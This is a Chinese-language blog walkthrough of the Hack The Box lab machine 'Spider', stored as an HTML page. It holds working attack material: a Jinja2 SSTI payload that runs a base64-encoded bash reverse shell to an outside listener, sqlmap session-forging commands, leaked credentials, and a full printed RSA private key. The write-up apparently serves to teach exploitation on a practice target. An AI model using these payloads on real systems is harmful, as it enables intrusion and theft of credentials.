@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Spider - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Spider靶场信息   靶场类型   信息搜集 使用nmap进行端口扫描 nmap -A -sS -sV -sC 10.10.10.243    我们可以看到，存在22和80端口，咱们访问一下80端口   会被重定向到spider.htb，咱们先把它加入hosts文件吧 echo 10.10.10.243 spider.htb &gt; &#x2F;etc&#x2F;hosts    再访">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spider - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Spider靶场信息   靶场类型   信息搜集 使用nmap进行端口扫描 nmap -A -sS -sV -sC 10.10.10.243    我们可以看到，存在22和80端口，咱们访问一下80端口   会被重定向到spider.htb，咱们先把它加入hosts文件吧 echo 10.10.10.243 spider.htb &gt; &#x2F;etc&#x2F;hosts    再访">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/bc3a1e99-fb8a-4f92-9b33-ccc48ef886c3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f6acdc5b-7a37-4d88-8fca-330091eff548.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/a883c068-7413-4bed-ae09-6da01098c91f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/17240d54-3a90-4ec6-b89a-67a9b6c73b1f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/c0a054e4-7f1a-4166-b6d2-86d6ba76cea9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/eea7666e-c72a-40f1-940f-c686b73917f9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/9b5915ec-5ceb-4a12-afb0-693bb773bcd5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/fda6ccca-b9e4-415d-b50a-804ac10c7cd3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/5994df2b-3b30-48c5-9ce2-f6e71dcb5a91.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/708b8be6-9466-494c-b73d-26f5094de36b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/c518d2b5-98a6-4d03-9553-c638226ae439.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/179c86cf-a77b-4d73-b55f-a9c61a9a5b0d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/82db4e28-cc7f-4aa3-a8f7-0fe7812eb486.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/8ea66433-79fb-4559-a243-2876806263e4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/1b5dd0b8-961a-4081-9f24-4272a4191241.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/81fc7cdb-8b81-4bfa-bcc6-0dee6017b0d0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/873f3e1d-ecf8-4e32-99f8-2fbc15a8f3fe.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/b3470c7e-f903-4ade-9d15-a2b309dcc531.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/0f35ef84-d78e-4c5c-8872-ffe206f2a287.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f79a09de-9ce2-49c3-9bdd-1883f5c634cf.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/35f02974-11cd-4104-a425-7098b6a3bddf.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/aa0b7469-fe6b-4080-9943-eb7807d0a19d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f68c197d-856d-42a9-9f31-b7f1d528dbe9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/46c68b8a-cd88-41c9-8f01-351ee9706404.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/4e24d428-5099-4dd1-9973-948c7826023b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f9981509-39d4-4c44-bc42-e6e942df9bae.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/1ab2a0c4-e8c9-40cc-a0df-5b6e31eff10b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/cb10a2af-685b-41d0-a42f-5fc5d7a16f89.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/a05250c6-2ecb-4d90-a13d-ce02a299c18a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/714b09f4-e1bb-40c4-b75b-262fb14c92fd.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f43ce31d-0dce-46dd-aaa9-c12f91ffe119.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/5792fa2c-bb02-4b45-a82f-d99dd0a681a1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/bab9f47c-5225-4a79-a8c4-7c4a92a22020.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f989eb92-b70d-4f9e-b98e-077dc08aa466.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/83e5d54e-8dd5-4924-a717-c18d37fc3ea2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/d47f85a6-e834-4d86-9ed0-b6a751df3c7b.png">
+<meta property="article:published_time" content="2021-06-17T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:52:52.702Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/bc3a1e99-fb8a-4f92-9b33-ccc48ef886c3.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Spider - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Spider - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-06-17T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-06-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Spider"><span class="post-toc-text">Hackthebox - Spider</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hard/Hackthebox-Spider"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Spider - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-06-17 19:38:36" datetime="2021-06-17T11:38:36.000Z"  itemprop="datePublished">2021-06-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Spider"><a href="#Hackthebox-Spider" class="headerlink" title="Hackthebox - Spider"></a>Hackthebox - Spider</h1><p><strong>靶场信息</strong></p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/bc3a1e99-fb8a-4f92-9b33-ccc48ef886c3.png" class>
+
+<p><strong>靶场类型</strong></p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f6acdc5b-7a37-4d88-8fca-330091eff548.png" class>
+
+<p><strong>信息搜集</strong></p>
+<p>使用nmap进行端口扫描</p>
+<pre><code>nmap -A -sS -sV -sC 10.10.10.243
+</code></pre>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/a883c068-7413-4bed-ae09-6da01098c91f.png" class>
+
+<p>我们可以看到，存在22和80端口，咱们访问一下80端口</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/17240d54-3a90-4ec6-b89a-67a9b6c73b1f.png" class>
+
+<p>会被重定向到spider.htb，咱们先把它加入hosts文件吧</p>
+<pre><code>echo 10.10.10.243 spider.htb &gt; /etc/hosts
+</code></pre>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/c0a054e4-7f1a-4166-b6d2-86d6ba76cea9.png" class>
+
+<p>再访问可以发现是一个家具页面，咱们做一下信息搜集</p>
+<pre><code>gobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50
+</code></pre>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/eea7666e-c72a-40f1-940f-c686b73917f9.png" class>
+
+<pre><code>/cart (Status: 500) \[Size: 290\]
+/checkout (Status: 500) \[Size: 290\]
+/index (Status: 200) \[Size: 11273\]
+/login (Status: 200) \[Size: 1832\]
+/logout (Status: 302) \[Size: 209\] \[--&gt; http://spider.htb/\]
+/main (Status: 302) \[Size: 219\] \[--&gt; http://spider.htb/login\]
+/register (Status: 200) \[Size: 2130\]
+/user (Status: 302) \[Size: 219\] \[--&gt; http://spider.htb/login\]
+/view (Status: 302) \[Size: 219\] \[--&gt; [http://spider.htb/login](http://spider.htb/login)\]
+</code></pre>
+<p>我们可以看到，能访问的只有注册页面和登录页面，咱们先去看看注册页面</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/9b5915ec-5ceb-4a12-afb0-693bb773bcd5.png" class>
+
+<p>咱们注册一个用户</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/fda6ccca-b9e4-415d-b50a-804ac10c7cd3.png" class>
+
+<pre><code>7443d68c-02b2-428c-b622-af15604cd905
+</code></pre>
+<p>咱们得到了一段UUID，使用密码登录试试</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/5994df2b-3b30-48c5-9ce2-f6e71dcb5a91.png" class>
+
+<p>登录后似乎也只有这个页面可以点击，咱们再多看看</p>
+<p>在做信息搜集的时候，突然醒悟过来，这会不会是个SSTI？咱们测试一下</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/708b8be6-9466-494c-b73d-26f5094de36b.png" class>
+
+<p>咱们测试一下</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/c518d2b5-98a6-4d03-9553-c638226ae439.png" class>
+
+<p>登陆后查看一下我们的账户信息</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/179c86cf-a77b-4d73-b55f-a9c61a9a5b0d.png" class>
+
+<p>好家伙，确实是</p>
+<p>这里可以进行SSTI攻击，那么意味着服务器正在运行Jinja2或者Flask，这里是Flask</p>
+<p><strong>漏洞利用</strong></p>
+<p>这里我们查看一下config信息，注册一个用户</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/82db4e28-cc7f-4aa3-a8f7-0fe7812eb486.png" class>
+
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/8ea66433-79fb-4559-a243-2876806263e4.png" class>
+
+<pre><code>&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE\_EXCEPTIONS&#39;: None, &#39;PRESERVE\_CONTEXT\_ON\_EXCEPTION&#39;: None, &#39;SECRET\_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT\_SESSION\_LIFETIME&#39;: datetime.timedelta(31), &#39;USE\_X\_SENDFILE&#39;: False, &#39;SERVER\_NAME&#39;: None, &#39;APPLICATION\_ROOT&#39;: &#39;/&#39;, &#39;SESSION\_COOKIE\_NAME&#39;: &#39;session&#39;, &#39;SESSION\_COOKIE\_DOMAIN&#39;: False, &#39;SESSION\_COOKIE\_PATH&#39;: None, &#39;SESSION\_COOKIE\_HTTPONLY&#39;: True, &#39;SESSION\_COOKIE\_SECURE&#39;: False, &#39;SESSION\_COOKIE\_SAMESITE&#39;: None, &#39;SESSION\_REFRESH\_EACH\_REQUEST&#39;: True, &#39;MAX\_CONTENT\_LENGTH&#39;: None, &#39;SEND\_FILE\_MAX\_AGE\_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP\_BAD\_REQUEST\_ERRORS&#39;: None, &#39;TRAP\_HTTP\_EXCEPTIONS&#39;: False, &#39;EXPLAIN\_TEMPLATE\_LOADING&#39;: False, &#39;PREFERRED\_URL\_SCHEME&#39;: &#39;http&#39;, &#39;JSON\_AS\_ASCII&#39;: True, &#39;JSON\_SORT\_KEYS&#39;: True, &#39;JSONIFY\_PRETTYPRINT\_REGULAR&#39;: False, &#39;JSONIFY\_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES\_AUTO\_RELOAD&#39;: None, &#39;MAX\_COOKIE\_SIZE&#39;: 4093, &#39;RATELIMIT\_ENABLED&#39;: True, &#39;RATELIMIT\_DEFAULTS\_PER\_METHOD&#39;: False, &#39;RATELIMIT\_SWALLOW\_ERRORS&#39;: False, &#39;RATELIMIT\_HEADERS\_ENABLED&#39;: False, &#39;RATELIMIT\_STORAGE\_URL&#39;: &#39;memory://&#39;, &#39;RATELIMIT\_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT\_HEADER\_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT\_HEADER\_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT\_HEADER\_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT\_HEADER\_RETRY\_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD\_FOLDER&#39;: &#39;static/uploads&#39;}&gt;
+</code></pre>
+<p>我们得到了相关的配置信息</p>
+<p>我们筛选一下其中的关键信息</p>
+<pre><code>secret\_key = Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942
+</code></pre>
+<p>首先安装一下咱们需要的模块</p>
+<p>pip3 install flask_unsign</p>
+<p>然后咱们使用sqlmap的eval处理session参数</p>
+<pre><code>sqlmap http://spider.htb/ --eval &quot;from flask\_unsign import session as s; session = s.sign({&#39;uuid&#39;: session}, secret=&#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;)&quot; --cookie=&quot;session=\*&quot; --delay 1 --dump
+</code></pre>
+<p>第一个选项输入Y，后面的都输入N</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/1b5dd0b8-961a-4081-9f24-4272a4191241.png" class>
+
+<p>成功得到uuid和password</p>
+<pre><code>uuid = 129f60ea-30cf-4065-afb9-6be45ad38b73
+password = ch1VW4sHERE7331
+</code></pre>
+<p>咱们去登录</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/81fc7cdb-8b81-4bfa-bcc6-0dee6017b0d0.png" class>
+
+<p>啊哈，这次出现不一样的界面了</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/873f3e1d-ecf8-4e32-99f8-2fbc15a8f3fe.png" class>
+
+<p>让我们去检查一下messages</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/b3470c7e-f903-4ade-9d15-a2b309dcc531.png" class>
+
+<pre><code>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal
+</code></pre>
+<p>咱们得到了一个链接，去访问一下</p>
+<p><a href="http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal" target="_blank" rel="noopener">http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</a></p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/0f35ef84-d78e-4c5c-8872-ffe206f2a287.png" class>
+
+<p>首先让我们构造payload</p>
+<pre><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.54/4444 &lt;&amp;1&#39;
+</code></pre>
+<p>然后转化为base64格式</p>
+<pre><code>YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn
+</code></pre>
+<p>然后构造poc</p>
+<pre><code>{% with a = request\["application"\]\["\\x5f\\x5fglobals\\x5f\\x5f"\]\["\\x5f\\x5fbuiltins\\x5f\\x5f"\]["\\x5f\\x5fimport\\x5f\\x5f"]("os")["popen"]("echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn | base64 -d | bash")\["read"\]() %} a {% endwith %}
+</code></pre>
+<p>然后本地监听一个端口</p>
+<pre><code>nc -nvlp 4444
+</code></pre>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f79a09de-9ce2-49c3-9bdd-1883f5c634cf.png" class>
+
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/35f02974-11cd-4104-a425-7098b6a3bddf.png" class>
+
+<p>成功getshell</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/aa0b7469-fe6b-4080-9943-eb7807d0a19d.png" class>
+
+<p>成功拿到user权限的flag</p>
+<p><strong>权限提升</strong></p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f68c197d-856d-42a9-9f31-b7f1d528dbe9.png" class>
+
+<p>我们可以看到&#x2F;home&#x2F;chiv目录下存在.ssh目录，那应该是存在密钥的，咱们进去看看</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/46c68b8a-cd88-41c9-8f01-351ee9706404.png" class>
+
+<p>成功拿到私钥</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
+gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
+U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
+MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
+BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
+VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
+6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
+hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
+Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
+XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
+54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
+f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
+nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
+j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
+JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
+K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
+hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
+mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
+gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
+0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
+nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
+CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
+rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
+TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
+IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>保存到本地</p>
+<p>使用ssh进行登录</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/4e24d428-5099-4dd1-9973-948c7826023b.png" class>
+
+<p>登录成功</p>
+<p>查看一下正在运行的端口</p>
+<pre><code>ss -tupln
+</code></pre>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f9981509-39d4-4c44-bc42-e6e942df9bae.png" class>
+
+<p>咱们发现本地运行着8080端口</p>
+<p>咱们需要把端口转发出来</p>
+<pre><code>ssh -i id\_chiv -L 8080:localhost:8080 chiv@spider.htb
+</code></pre>
+<p>然后咱们打开firefox进行访问<a href="http://127.0.0.1:8080/" target="_blank" rel="noopener">http://127.0.0.1:8080/</a></p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/1ab2a0c4-e8c9-40cc-a0df-5b6e31eff10b.png" class>
+
+<p>端口转发成功</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/cb10a2af-685b-41d0-a42f-5fc5d7a16f89.png" class>
+
+<p>这边随便一个账户都可以登录</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/a05250c6-2ecb-4d90-a13d-ce02a299c18a.png" class>
+
+<p>咱们查看一下cookie，这里cookie需要解密</p>
+<pre><code>.eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\_zI8\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw
+</code></pre>
+<p>使用flask-unsign进行解码</p>
+<pre><code>flask-unsign --decode --cookie .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\_zI8\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw
+</code></pre>
+<p>返回了一段base64码</p>
+<pre><code>{&#39;lxml&#39;: b&#39;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=&#39;, &#39;points&#39;: 0}
+</code></pre>
+<p>咱们解密一下</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/714b09f4-e1bb-40c4-b75b-262fb14c92fd.png" class>
+
+<p>咱们查看源代码</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f43ce31d-0dce-46dd-aaa9-c12f91ffe119.png" class>
+
+<p>我们在登录页面的源代码中可以看到有一个hidden值，所以咱们可以利用XXE攻击</p>
+<p>参考链接</p>
+<blockquote>
